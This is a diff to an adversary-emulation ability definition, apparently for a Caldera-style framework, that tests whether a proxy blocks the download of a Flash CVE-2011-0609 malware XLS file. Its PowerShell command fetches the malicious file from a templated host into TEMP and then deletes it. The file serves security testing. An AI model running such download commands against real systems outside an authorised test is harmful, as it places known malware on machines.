@@ -1,7 +1,7 @@
 - tactic: execution
   technique_name: Exploitation for Client Execution
   technique_id: T1203
-  name: 'Malware: Download Flash CVE-2011-0609 XLS file'
+  name: 'Malware: CSA - Flash Vulnerabilities'
   description: Adversaries exploit vulnerabilities in client applications, often due
     to insecure coding, to execute arbitrary code and gain remote access to systems.
     These vulnerabilities are valuable targets for exploitation, as they allow attackers
@@ -9,15 +9,17 @@
   executors:
   - name: psh
     platform: windows
-    command: "Invoke-WebRequest http://#{caldera.host}/malware/crscan.xls -OutFile\
-      \ $env:TEMP/crscan.xls; \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\\
-      crscan.xls\" -Force"
+    command: "$response = Invoke-WebRequest #{ignite.url}/malware/crscan.xls -ErrorAction\
+      \ Stop;\n\nif ($response.Headers[\"Content-Type\"] -like \"text/html*\") {\n\
+      \    throw \"Blocked by proxy \u2014 received HTML instead of native error.\"\
+      \n};\n$response.Content | Set-Content \"$env:TEMP\\crscan.xls\";\nStart-Sleep\
+      \ -Seconds 3;\nRemove-Item \"$env:TEMP\\crscan.xls\" -Force"
     code: null
     language: null
     build_target: null
     payloads: []
     uploads: []
-    timeout: 15
+    timeout: 10
     parsers: []
     cleanup: []
     variations: []
@@ -25,11 +27,11 @@
   requirements: []
   privilege: ''
   repeatable: false
-  buckets: []
-  additional_info:
-    cleanup: '[]'
+  buckets:
+  - execution
+  additional_info: {}
   access: {}
   singleton: true
   plugin: ''
   delete_payload: true
-  id: d3f5a22f-fff7-41a6-a1fa-e1fede5d196b
+  id: 0d6c38b3-d941-4b10-971f-84b06f0db3ce
